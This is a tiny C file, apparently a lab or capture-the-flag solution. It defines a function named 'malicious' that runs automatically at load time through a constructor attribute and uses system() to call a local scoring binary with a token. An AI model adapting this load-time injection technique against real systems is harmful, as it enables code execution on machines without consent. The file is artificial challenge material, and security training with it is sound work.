#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score c7147eba-3aca-4179-8663-6d788dba0a84");
}
